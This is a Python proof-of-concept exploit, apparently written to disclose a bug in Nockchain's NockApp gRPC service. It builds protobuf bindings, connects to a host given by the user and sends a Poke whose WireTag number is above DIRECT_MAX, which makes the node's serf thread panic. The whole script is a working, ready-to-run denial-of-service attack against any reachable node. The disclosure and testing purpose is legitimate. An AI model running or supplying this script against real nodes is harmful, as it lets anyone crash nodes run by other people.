#!/usr/bin/env python3
"""
POC: WireTag DIRECT_MAX Panic
==============================

Triggers panic in serf thread via Poke with large WireTag number.

thread 'serf' panicked at crates/nockvm/rust/nockvm/src/noun.rs:220:13:
Number is greater than DIRECT_MAX

Path: WireTag.as_noun -> wire_to_noun -> D() -> panic

Usage:
  python3 poc_wire_panic.py <host> [port]
"""

import sys
import os
import subprocess
import tempfile
import shutil

def generate_proto_bindings(proto_dir):
    out_dir = tempfile.mkdtemp(prefix="poc_")
    for proto in ["nockchain/common/v1/primitives.proto", "nockchain/private/v1/nockapp.proto"]:
        subprocess.run([
            sys.executable, "-m", "grpc_tools.protoc",
            f"-I{proto_dir}", f"--python_out={out_dir}", f"--grpc_python_out={out_dir}",
            os.path.join(proto_dir, proto)
        ], capture_output=True)
    for pkg in ["nockchain", "nockchain/common", "nockchain/common/v1",
                "nockchain/private", "nockchain/private/v1"]:
        os.makedirs(os.path.join(out_dir, pkg), exist_ok=True)
        open(os.path.join(out_dir, pkg, "__init__.py"), 'a').close()
    return out_dir


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

    # Adjust this path as needed
    proto_dir = "crates/nockapp-grpc-proto/proto"
    out_dir = generate_proto_bindings(proto_dir)
    sys.path.insert(0, out_dir)

    try:
        import grpc
        from nockchain.common.v1 import primitives_pb2
        from nockchain.private.v1 import nockapp_pb2, nockapp_pb2_grpc

        # DIRECT_MAX = u64::MAX >> 1 = 0x7FFFFFFFFFFFFFFF
        # Any value > DIRECT_MAX triggers panic
        CRASH_VALUE = 0xFFFFFFFFFFFFFFFF  # u64 max

        channel = grpc.insecure_channel(f"{host}:{port}")
        stub = nockapp_pb2_grpc.NockAppServiceStub(channel)

        wire = primitives_pb2.Wire(
            source="poc",
            version=1,
            tags=[primitives_pb2.WireTag(number=CRASH_VALUE)]
        )

        # JAM-encoded atom 0
        valid_jam_atom_zero = bytes([0x02])

        print(f"Sending Poke with WireTag(number=0x{CRASH_VALUE:X})...")

        try:
            req = nockapp_pb2.PokeRequest(pid=1, wire=wire, payload=valid_jam_atom_zero)
            resp = stub.Poke(req, timeout=5)
            print(f"Response: {resp}")
        except grpc.RpcError as e:
            print(f"gRPC Error: {e.code()} - {e.details()}")

        channel.close()
    finally:
        shutil.rmtree(out_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
